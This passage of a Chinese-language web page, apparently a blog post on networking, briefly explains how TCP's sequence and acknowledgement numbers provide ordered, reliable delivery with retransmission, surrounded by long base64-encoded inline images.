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" alt="avatar"></p><h4><span id="tcp为什么是可靠传输协议">TCP为什么是可靠传输协议</span></h4><p>通过上图可知，TCP是通过<strong>确认号(ACK)**和</strong>序号(SEQ)**，来保证数据顺序以及丢包重发,即某个带序号的包没有收到回复，那么TCP会重发该包直到确认送达。</p><p><img src="data:image/jpg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0aHBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/2wBDAQkJCQwLDBgNDRgyIRwhMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjL/wAARCAGsAwwDASIAAhEBAxEB/8QAHAABAAICAwEAAAAAAAAAAAAAAAYHBAUBAgMI/8QAWRAAAQMDAwIDBQMFCggLBwUBAQACAwQFEQYSIQcxE0FRFBUiYXEygZEWFyNCoQgzUlVylLGy0dIYJDdWYnN0kjQ1Q1NUk5WiweHwJSYnRFez8TZFgoS0wv/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwC/0REBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREGPXVkNuoKitqXbYII3SyO9GgZKgtw6oRNrbdS22z3GoqajbPLTS0zo5PZjwZGeuDjg9+VObg6mZQzGr8IwbTvErdzSPQjz+ioe8zUl4vtY60+2++Yw5tZdK+0zSR4c3DYY4hG50ePhLSQMDcecoLftmsaO6XeO2RUNzimfC6YOmpSxgaDjJd8zwFmXK+0tHUyW5kzfeRpX1EUTo3lpaOAXFo4GeO+fRQrplqehfRU+nrfpW521tM6SKWTwiYGSMwXZe7DskkHBAPPZZD6O5XDq7cprZcXUcVLbKeGpeKdsm55e57WfF2+Hnj1CCQWzV9HUUdlFxZJQXC6AtipJI37vEaCXtzt8sHk4yFI1FavS1wrdT2a7VN58WK2zSStpzTNbnfEWcOBz3OeVKkBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERBpdXXmfT2lLld6aBs81JD4jY3kgHBGc45wBk/cotL1CrBfobVBBb53y1dPTmWOdxazxInyHOPMbR+K2/Ux8jOnV6bDIGSyQiJnIGS9zWgc+ucfeqrvdtvMGr30Yq4aa4e8aX2eppoGxNafZZSDtOR3yCSgtzTWpnX643enDaZ8FBJHGyppZvEjlLmbnAH1HZa64azqIdZNt1JFTPtsMb46qqnl8JjanAc2IPwRnZkkY+/gharpbPLc6e+3elmkNBUTNZT0spjBbK1g8Vx2Afaee/oAVGNU2i+S19s0ibVTvoJq1s8dvo6gNZUQRnfK+VzgXgkkDcT39coLT0nqCo1LaXXGW2vooXyuFPvkD/GjHaQcDAPOPlyozrzqBWaUuE9PA2gxDQira2pEm+Z28t2N28Dt5rF0ONV+/Ky2+3MistqlZAaer2VE4ywO2NlZgYAIHxDOCtV1CuNXNdbla46O6UtLHRvrK+pZXNa+SmblpbEzJGHHjnnHl6htpOo1wi1Wy0brPI41dNB4DHSGZzJWNLntIy1waSee3rjzs1fOFdbDS18VZZrTcai0MkZaoIPe/gSsfIA8sjc3B2Hc3Ifnn5L6HoRMKCnFQzw5/Cb4jN+/a7HI3efPn5oMhERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQFFTostvVzuVLfrpRvuErZJY6cxhuWsDR9phPYKVLBul1gtNN487ZX5OGxwxl73nvhrRyTjJwOcA+iDD05p5unaKpp2VtTVuqKqSpfLUkFxc85PYAfsWTZ7NT2eCZkLnyS1Erp55pDl8r3dyfuwAOwAC8qe+x1IZ4dJV5eAcGLG3JwA707fT5rHn1XSQBxNJcXABpLhRyYGewPGR+CDfItFW6wstvu9vtdVVOirbhIY6eJ0bsvIOM9uBnjJ7reoCIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiDDuFspLoyBlZF4scMzZ2sJIBe3lpI88HBwfMA+SjtV0103WzSSVNPUSmWqFVIH1T3bnBhYGkk524cfhz+zhS5EGsptPWqiuj7lSUUdPVvhELnxZYHMHYFoO048jjI7Lwo9L22llq6hzJJ62rjMc9XLITK5nPwhwxtHPAbhZdwuLqLIZSyVL/DdIIoXN8R2COA0kZ791hsvVc+OjkFjrA2aNr5WOc0PhycYIzyR54PYIPTT2nKHTVA+lojNJ4krppZqiQySyvPm5x5JwAPoFxc9LWO8VE09xtsFTLLT+zPfIMnw852j05PcYK4qL1Usw2C0Vz3ueGDMYABxnJOeB81rBreNms7fpiot1TFVVlO6dshI2AAHj18j+xBnjRunRKJRaKYSipZVCTb8QlaAGuB78ADjt8lvURAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQERa+93u36dtM10ulQIKOHG+QtJxkgDgc9yEGwRQv8AOppY/wDzFb/2fP8A3VwequlWjLqmsAyBzb5xyeB+qgmqKEM6s6Rk+xWVTuSPhoZj27/q+S6VHV3SNM0b6qr8R32I/YZQ559GgtGTyPxQTpFXp6wWFve334cZ5tj12d1g06HOApL04DsRbJMH6ILARQM9XNNinbL4V2LycGIW2Xe35njH7V3i6s6Zkle13vONrez322YB/wBPhQTlFCm9VdKOGW1NYR6i3zn/AP5XB6r6Ta9rDV1Ye4EtaaCbJx3wNqCbIoS3qtpN7nNZVVbi07XAUExIPfB+Hg8j8V1g6v6FnY535QQR7TgiVj2n7gQgnC1NzqpoLzZoWRPfHPNIx7hjazETnDPnnjj71oj1Y0MO2oqV54w1ge4nPkAByV6XTULW6p03GymrpKSqgnqBNDG7AIDA3eAe2HOJBHfb80EvRaim1HRVeRC2pLmjc5rqdzC1uSMkOAOOCsKp1xZqKmp56x9TTsnlMID6Z+Wv9CADhBBupBH53enww/PtJ52fD9oefr8vp6q3fJUbqG60urutOlX2WKpqGWwiSrnMbmxxszuzyOBweex4AV3yyMhhfLI7axjS5xPkB3QQ7VHUOh0zqyxWOZge64ybZn5/eGu+FhP1dxz5AlTRUrcbDXa70zqS+++I6SlrZC+OGagPixMp8+EN2dzCcZOAT8XHdT7pzqGbUei6GprGysr42CGqbLGWO8RvGcH1GD96CWIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgrLU9+1BT9U6CwUWoKW3UFVRGqc6pp2O2lpcNoJIznAPf1W60Bqmt1ELxTVzqeofbaw07a2lYWw1DcdxknkdjglRnV9pqKzq/arvPp2vuNooqF8Evh0rZWPe7fgbXEZA3jn1Wd0usdyslbqOplt8tosVTUCWht9Q4F0WAdzsAkNB44z5fJBNn0jXanirPaJA+OkdGIQTtcC8HcfLIxx58lbVVxetfwWnX1nZ43j2e40ZihlhnYYzO5/wk89sDG75n0K2ds6kW253h9DFTTBgjZKyoM0Ra8O7jAdnIPGOUE0VU3nZ/hEaexJI6T3fIS1zwWtGHYwPLPOVO6vU1HSW6Wt2Pmjj3HETmuLmgH4hzgjIx34VRG/UlT1fotW1dO6go4aB7ZPEkD37xlmx2HYB+LgDuMlBfCKu4Oo97q4RNSaBu1RET8L46iFzSPqCefksp+vL4IwWdP7+6THLSYg0H0zu/8EE6RQNuvb9tO7p7fg7IwA6I5Hn+t/8An5L1dru7+I0N0FqIs53OLYgR6YG/lBN0UK/Lq5/5i6k/6uL++sKfqhPTTOhl0RqkPb3DaMOH4tJH7UFhIq6HVdxcAdFaqAzyfd54Xb86o3NH5G6r2nOT7udxyfx8vxQWGigQ19fi8kdPb94R5a7dFk/UbuFzJ1CuscsDDoHUeZXFp+CM7eM+Tv6cIJ4ihX5dXP8AzF1J/wBXF/fXDte3JuM6F1Lz6RRH+h6CbIq5/Ou7/MrVX8wK6u6wUdNJCbjprUNvppJGxmoqaMtYwuOBkoLIREQEREBERAREQEREBERAREQFCeq2RoWQgZPttHx6/wCMRqbKFdVcjQkzsEhtZSOOB2AqI8oJoOy5wuGnIXKDgADsELQcZAOFyiAmERAREQMYXGBnPmuUQcYAz8118GL/AJtn+6F3RBpNVObSaTu08dJ4746SRwjZgF3wngFfKv6aqqaa4PvDKCslZnfBXEujazaAwt8ndiACB27YX1xdqijpbXUS17N9LsLZGeGZN4PG3aAc5zjCpiot+hzcJZx05vckcsviFjLc6NrPhLcBvHHOdoPcA4QR+OsjdDbJqHVo8eBgjM80wEgcZC07Qcgt24yT2xwTlVtcbxdWSPZHcHMhie5rPDmdtI37mloPbyIPfjvlXY86PpGPho+lFbUjOze6iJAB7nc8E8Y/bwsR0GhhEXjpjfBIx5eQKN5I+Id88YODwO3OMZQVQ3UGqnyx1L9QytjqCIDI6o+BwYwtw5vmA0kcjnPzVyfue71c7rHfIrhXz1UcHgiJskhcG53ZIz64GfVYHh9PhsMnTW9saGEg+yv+1glzDzk7Tnn5BTvp3e7BW1lVRWPSdTaAyFj5qg0QhjlPk0nAJIyfLyKCw8JhEQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQFo9Y1LaLR13qnFrRDSyP3Oi8QDA7lvmFvFrNQVFxpbJUy2m3R3GtAAjppJAxr8kA5J8gMn54QfKlqZZ7xbK99bqGjt87HxPEs8G6UvO4HY4DOBtaeMAenKjklY+11tLcrfdhNPFujikY3Y9oDcA4OcfaP4L6Vlq74ykbUVPS6lnqdhMwilgOX8425GT5Zz257rBqLxdC+F0PR8vYNhcZBC1zXc78AA5GDweM85wg+fqC5S+LWU9NepqeKUukEs7iC8ng8AkZJPfyA7rXy0dK2ibuuYfOP+QDThjj3GexHzHmr8ra7Uftk5oekFKadwLGumija8x5JAIGQDk5zlbkXDXsrI3/AJvqGN2GOOKqMZIBDgWnyIOPXhBh/udWFui7geS01xw4ggH4G5VxKN6Vr9RVj68X2yxWyJkg9kbHIHl7Ocl2DjPbt6qSICIiAiIgIiICIiAiIgKuetn+T/8A/v039dWMq/6zxl3Tasmy0Mp54Jnk47CRvbPnz5ILACLzhlbPAyVmdr2hwyPI8r0QEREBERAREQEREBERAREQFD+qf+TO+f6lv9dqmCh3VX/Jlfe/7y3t/LaglsP7wz+SP6F6Lxpf+Cxfa+w37fft5/NeyAiIgIiICIiAiIgjF86haW05c2267XeGmqiATG5riWgjIJwOAVqj1k0IIDL7+jwGB+0RP3HOeMY78dlRfXw//FGf/ZYf6qrDJ9UH2WerWhA0OOpKTB9A/P8AQtY/rjoNrC4XWV2BnDaZ+T+xfJGT6lcIPrhvXLQbv/3SZvAPNM/+xdvz4aD/AI3k/m0n9i+RUQfXX58NB/xvJ/NpP7E/PhoP+N5P5tJ/YvkVEH11+fDQf8bSfzaT+xct636Dc4D3u8ZOMmmk/sXyImUH38xwewOactIyCuVX3RWtqK7pfbH1Eplex0sYc7OcB5xknv3VgoCIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAqkvPXyy2O+11qqbRcHyUkz4S+NzCHFpxnkjvyrbXxL1C/yh6g/2+X+sgvFn7pHTpYC+zXUOxyG+GQPv3Lt/hIab/ie7fhH/eXzOiD6Y/wj9NfxPdvwi/vLj/CP01/E12/CL+8vmhEH0v8A4R+mv4mu34Rf3lhO/dKW7cdunKktzxmobnH4L51RB9Ff4SlB/m5Ufzhv9i5P7pS34GNO1XbnNQ3v+C+dEQfRbf3SlvLhu07VBueSKhpOPwVzWm7UV7tsNfQVEc8EoyHRvDgD5g48wvg5fW3QnP5qrfndjxpsZjDf1z2P6w+f1HkgslERAREQEREBERAUD6zOLekt9Ix9iIcjPeZinigfWZ23pLfTgH4IhyM/8sxBMrb/AMV0n+pZ/VCyli23/iuk/wBSz+qFlICIiAiIgIiICIiAiIgIiICh/VP/ACZ3z/Ut/rtUwUO6q7vzZ3vbj96ZnPp4jcoJbD+8M/kj+hei84f3iP8Akj+hY91rxa7XU17oJp2U8ZkfHCMvLRycDzIGTjzwgzEWJbblSXe209woZRNS1DBJFIAfiaV2qrhR0TSampiiw0uw53JA9B3KDJRac6jpHT2hkDJZmXNzxE8N2hoa0uJIdg44x2WfXVsdvt1TWzBxip4nyvDRzhoJOPwQZKLRQ6vsslso6+asZTR1VIysa2Y4c2NzQ4F3p3GVl2+/Wy7RSS2+rZUxxsDy+IFzSCCQQcYd28kGyRaUaptTq80AllNYIhMYPAfvDCdodjHbPC72rUttvbmG3PmqIXtc5s7YH+F8LtpG8jGc5GPkUHzN18/yoz/7LD/VUAqbNWUUNNLVsZB7SN0bJXhry3yeW9w0+RPdWT1p9m/PNH7Z/wAF8Om8b+R+t+zKi/VMT/nIvD5QfDkla6nd5Oh2jwy31btxhBo/ybuomuML6Uslt0Pj1LHuALWZAyPX7Q7eq1sUUk0rIomOfI9wa1jRkuJ7ABS/R74n2DWLqhwdMLSGxbid2PFYODnt24815dNquK36+tVXUnZCJXRCUj4WPexzWEny+Ijny7oI/Jaqxl192Ni8Ws3+H4URDyX/AMEY7ny+q701oqJ6OorJHNp6WnkbFJLLkfpHBxDAAMk/Cfp5rPsVvun5d0FDGHRXNtexmX/qSB/JP0wSVJb1qyjj1RqWlltzLhpi4XF8hjb8BZICQJYnj7L8E+oIPIQQy2WSsvF3itlAIpamVrnNHiNDcNYXn4jxwAfwWuVqaO0/S2bq9Z20lQ6qt1VRS1lMZW4kMT6eTDXgfZd3Hp5juFWB2uY/ZE7IO7dnO1vp+0coMyssdfQSULKiJrXV0DaiD9I34mOzgnnjse6xaujqaCqfTVcEkE8Zw6ORuCPuUr11IKp2mIoYn722SmYGgE7id3b17/iu/UaaN9VYqd73m4Utop4K1rsEskAOGk+ZDSM+nZB9DdEQ8dK7VvEgBdKW73AjHiO7eg78fVWIq66HsjZ0rtZZIHFz5S7APwneeOfu/FWKgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiICIiAiIgIiIC+KdeQy1PUq+QQRuklkuMjWMYMlxLuAB6r7WXx5erlDZ+t1VcqkOMFJevGkDe+1smTj7kEeudhjst0bbK+vjbVAAVAiYXtpnnHwPPmW+e3OO3JzjJ/JMe6NQ17LlDMLO+FuIWOc2dsj9ocHcYH15Xp1Ao5YNYV9YZRUUlfM+ppalhBbNG45BGOPkR5YWdpl2OmOuQS0BzaHGSMk+P5fcgi9ntFZfbpDbqCMSVEpOATgAAZLifIAAkn0C9KCyz3W7OttukjqJyHeCG5HjEDOG5HcgHAOMqQaEkba62aWvBpqS70NVbYKxw+GOV7MB3rgEgE+WVh6Ia2h17a6mslbTQW+qbU1